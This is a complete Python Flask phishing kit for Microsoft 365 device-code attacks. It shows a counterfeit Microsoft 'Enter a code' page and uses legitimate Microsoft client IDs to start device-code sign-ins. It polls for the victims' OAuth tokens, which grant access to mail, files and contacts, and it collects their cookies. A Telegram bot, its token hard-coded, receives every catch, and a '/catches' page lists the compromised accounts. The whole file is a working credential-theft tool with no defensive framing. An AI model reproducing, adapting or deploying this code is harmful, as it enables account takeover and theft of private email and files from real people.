import os
import json
import time
import base64
import sqlite3
import signal
import threading
import traceback
import atexit
from datetime import datetime, timedelta

import requests
from flask import Flask, request, jsonify, render_template_string

# ---------------- CONFIG ----------------
BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
CHAT_ID = "8877118461"
DB_PATH = "/tmp/phish.db"

TENANT = "common"
AUTH_BASE = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0"
SCOPES = "offline_access openid profile Mail.Read Mail.ReadWrite Contacts.Read Files.Read.All User.Read"

CLIENT_IDS = [
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
    "b26aadf8-566f-4478-926f-589f601d9c74",  # OneDrive
    "27922004-5251-4030-b22d-91ecd9a37ea4",  # Outlook Mobile
    "29d9ed98-a469-4536-ade2-f981bc1d605e",  # Microsoft Auth Broker
]
client_id_index = 0
index_lock = threading.Lock()

# ---------------- DATABASE ----------------
def db():
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

def init_db():
    conn = db()
    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_code TEXT,
        user_code TEXT,
        client_id TEXT,
        status TEXT DEFAULT 'pending',
        email TEXT,
        tokens TEXT,
        cookies TEXT,
        created_at TEXT,
        expires_at TEXT,
        caught_at TEXT
    )""")
    conn.commit()
    conn.close()

init_db()

# ---------------- TELEGRAM ----------------
def send_telegram(text):
    """Send text, splitting into chunks under Telegram's 4096 limit."""
    try:
        MAX = 4000
        chunks = [text[i:i + MAX] for i in range(0, len(text), MAX)]
        for c in chunks:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": c},
                timeout=15
            )
            print(f"[TG] status={r.status_code} resp={r.text[:200]}")
            if r.status_code != 200:
                return False
        return True
    except Exception as e:
        print(f"[TG] exception: {e}")
        return False

def send_telegram_file(text, filename="catch.txt"):
    """Send large payloads as a .txt document (no size problem)."""
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
            data={"chat_id": CHAT_ID},
            files={"document": (filename, text.encode("utf-8"))},
            timeout=30
        )
        print(f"[TG-file] status={r.status_code}")
        return r.status_code == 200
    except Exception as e:
        print(f"[TG-file] exception: {e}")
        return False

# ---------------- HELPERS ----------------
def decode_id_token(id_token):
    try:
        payload = id_token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        return (data.get("email") or data.get("preferred_username")
                or data.get("upn") or data.get("unique_name") or "unknown")
    except Exception as e:
        print(f"[HELPER] id_token decode error: {e}")
        return "unknown"

def start_device_code():
    """Try current client ID; on failure rotate and retry through the whole list."""
    global client_id_index
    last_err = None
    for _ in range(len(CLIENT_IDS)):
        with index_lock:
            cid = CLIENT_IDS[client_id_index]
        try:
            r = requests.post(f"{AUTH_BASE}/devicecode",
                              data={"client_id": cid, "scope": SCOPES}, timeout=15)
            d = r.json()
        except Exception as e:
            print(f"[INDEX] devicecode request error: {e}")
            d = {}
        print(f"[INDEX] devicecode resp keys: {list(d.keys())}")
        if "user_code" in d:
            return cid, d
        last_err = d
        with index_lock:
            client_id_index = (client_id_index + 1) % len(CLIENT_IDS)
            print(f"[ROTATE] Switched to client ID index {client_id_index}")
        time.sleep(0.3)
    raise RuntimeError(f"all client IDs failed: {last_err}")

# ---------------- WORKER ----------------
shutdown_event = threading.Event()

def poll_worker():
    print("[WORKER] poll_worker started")
    while not shutdown_event.is_set():
        try:
            conn = db()
            rows = conn.execute(
                "SELECT id, device_code, client_id, cookies, expires_at "
                "FROM sessions WHERE status='pending'"
            ).fetchall()
            conn.close()

            if rows:
                print(f"[WORKER] polling {len(rows)} pending session(s)")

            for row in rows:
                if shutdown_event.is_set():
                    break
                sid, device_code, cid, cookies, expires_at = row

                try:
                    if expires_at and datetime.utcnow() > datetime.fromisoformat(expires_at):
                        conn = db()
                        conn.execute("UPDATE sessions SET status='expired' WHERE id=?", (sid,))
                        conn.commit()
                        conn.close()
                        print(f"[WORKER] session {sid} expired")
                        continue
                except Exception:
                    pass

                r = requests.post(f"{AUTH_BASE}/token", data={
                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                    "device_code": device_code,
                    "client_id": cid,
                }, timeout=15)
                d = r.json()

                if "access_token" in d:
                    email = decode_id_token(d.get("id_token", ""))
                    payload = json.dumps(d, indent=2)
                    if cookies:
                        payload += "\n\n=== COOKIES ===\n" + cookies

                    conn = db()
                    conn.execute(
                        "UPDATE sessions SET status='caught', email=?, tokens=?, caught_at=? WHERE id=?",
                        (email, payload, datetime.utcnow().isoformat(), sid)
                    )
                    conn.commit()
                    conn.close()

                    summary = (
                        "🎯 NEW CATCH\n\n"
                        f"📧 Email: {email}\n"
                        f"🆔 Session: {sid}\n"
                        f"🔑 Client ID: {cid}\n"
                        f"🕒 {datetime.utcnow().isoformat()}Z\n\n"
                        "Full tokens attached below 👇"
                    )
                    send_telegram(summary)
                    file_ok = send_telegram_file(payload, filename=f"catch_{email}_{sid}.txt")
                    if not file_ok:
                        send_telegram("RAW TOKENS:\n\n" + payload)  # chunked fallback
                    print(f"[WORKER] session {sid} caught email={email} file_ok={file_ok}")

                else:
                    err = d.get("error")
                    if err == "authorization_pending":
                        pass
                    elif err == "slow_down":
                        time.sleep(3)
                    elif err == "expired_token":
                        conn = db()
                        conn.execute("UPDATE sessions SET status='expired' WHERE id=?", (sid,))
                        conn.commit()
                        conn.close()
                        print(f"[WORKER] session {sid} expired_token")
                    else:
                        print(f"[WORKER] session {sid} poll error: {err} {str(d.get('error_description',''))[:120]}")

        except Exception as e:
            print(f"[WORKER] loop error: {e}")
            traceback.print_exc()

        shutdown_event.wait(5)
    print("[WORKER] poll_worker stopped")

_worker_started = False
def start_worker():
    global _worker_started
    if not _worker_started:
        t = threading.Thread(target=poll_worker, daemon=True)
        t.start()
        print("[WORKER] thread launched")
        _worker_started = True

start_worker()

def handle_shutdown(sig, frame):
    print("[SHUTDOWN] signal received, stopping worker...")
    shutdown_event.set()

signal.signal(signal.SIGTERM, handle_shutdown)
signal.signal(signal.SIGINT, handle_shutdown)
atexit.register(lambda: shutdown_event.set())

# ---------------- APP ----------------
app = Flask(__name__)

PAGE_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif; background:#fff; color:#1b1b1b; }
  .logo { padding:22px 40px; display:flex; align-items:center; gap:10px; }
  .logo span { font-size:18px; color:#737373; }
  .card { max-width:440px; margin:60px auto; padding:44px 44px 50px; border:1px solid #e6e6e6; box-shadow:0 2px 6px rgba(0,0,0,.2); background:#fff; }
  h1 { font-size:24px; font-weight:600; margin-bottom:16px; }
  p { font-size:15px; line-height:1.5; color:#1b1b1b; margin-bottom:18px; }
  .codebox { background:#f2f2f2; border:1px solid #e0e0e0; padding:16px 18px; font-size:26px; letter-spacing:2px; font-weight:600; text-align:center; margin-bottom:22px; user-select:all; }
  .btn { display:block; width:100%; padding:10px 12px; background:#0067b8; color:#fff; border:none; font-size:15px; font-family:inherit; cursor:pointer; }
  .btn:hover { background:#005da6; }
  .btn:active { background:#00539a; }
  .foot { max-width:440px; margin:24px auto 60px; padding:0 44px; font-size:12px; color:#616161; }
  @media (max-width:600px){ .card{ margin:20px; padding:28px 24px; } .foot{ padding:0 24px; } .logo{ padding:16px 24px; } }
</style>
</head>
<body>
  <div class="logo">
    <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><rect x="1" y="1" width="10.5" height="10.5" fill="#f25022"/><rect x="12.5" y="1" width="10.5" height="10.5" fill="#7fba00"/><rect x="1" y="12.5" width="10.5" height="10.5" fill="#00a4ef"/><rect x="12.5" y="12.5" width="10.5" height="10.5" fill="#ffb900"/></svg>
    <span>Microsoft</span>
  </div>
  <div class="card">
    <h1>Enter a code</h1>
    <p>To sign in, enter the code below on the sign-in page. We've made it easy — just tap the button and the code is copied for you.</p>
    <div class="codebox">{{ user_code }}</div>
    <button class="btn" onclick="copyAndGo()">Copy code and continue</button>
  </div>
  <div class="foot">Privacy &amp; cookies &nbsp;·&nbsp; Terms of use &nbsp;·&nbsp; © 2026 Microsoft</div>
<script>
function copyAndGo() {
  var code = "{{ user_code }}";
  var done = function(){ window.location.href = "https://microsoft.com/devicelogin"; };
  function fallback() {
    var t = document.createElement("textarea");
    t.value = code;
    t.style.position = "fixed"; t.style.opacity = "0";
    document.body.appendChild(t);
    t.select();
    try { document.execCommand("copy"); } catch(e) {}
    document.body.removeChild(t);
    done();
  }
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(code).then(done, fallback);
  } else { fallback(); }
}
</script>
</body>
</html>"""

@app.route("/")
def index():
    try:
        cid, dc = start_device_code()
    except Exception as e:
        print(f"[INDEX] all client IDs failed: {e}")
        return "Service temporarily unavailable, please try again.", 500

    conn = db()
    cur = conn.execute(
        "INSERT INTO sessions (device_code, user_code, client_id, status, created_at, expires_at) "
        "VALUES (?,?,?,?,?,?)",
        (dc["device_code"], dc["user_code"], cid, "pending",
         datetime.utcnow().isoformat(),
         (datetime.utcnow() + timedelta(seconds=dc.get("expires_in", 900))).isoformat())
    )
    conn.commit()
    conn.close()
    print(f"[INDEX] new session {cur.lastrowid} code={dc['user_code']} cid={cid}")
    return render_template_string(PAGE_HTML, user_code=dc["user_code"])

@app.route("/test_tg")
def test_tg():
    ok = send_telegram("✅ Test message from outlook-verify — chunked sender works!")
    return jsonify({"telegram_ok": ok})

@app.route("/collect", methods=["POST", "GET"])
def collect():
    """Receives cookies from the victim page and attaches them to a pending session."""
    data = request.get_json(silent=True) or request.args.to_dict()
    user_code = data.get("user_code")
    cookies = data.get("cookies")
    if not user_code or not cookies:
        return jsonify({"ok": False, "error": "need user_code and cookies"}), 400
    if not isinstance(cookies, str):
        cookies = json.dumps(cookies)
    conn = db()
    cur = conn.execute(
        "UPDATE sessions SET cookies=? WHERE user_code=? AND status='pending'",
        (cookies, user_code)
    )
    conn.commit()
    conn.close()
    print(f"[COLLECT] cookies stored for {user_code} (rows={cur.rowcount})")
    send_telegram(f"🍪 Cookies received for session code {user_code}")
    return jsonify({"ok": True})

@app.route("/catches")
def catches():
    conn = db()
    rows = conn.execute(
        "SELECT id, user_code, status, email, caught_at, created_at FROM sessions ORDER BY id DESC LIMIT 100"
    ).fetchall()
    conn.close()
    out = "<h2>Catches</h2><table border=1 cellpadding=6><tr><th>ID</th><th>Code</th><th>Status</th><th>Email</th><th>Caught</th><th>Created</th></tr>"
    for r in rows:
        out += "<tr>" + "".join(f"<td>{(c or '')}</td>" for c in r) + "</tr>"
    out += "</table>"
    return out

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
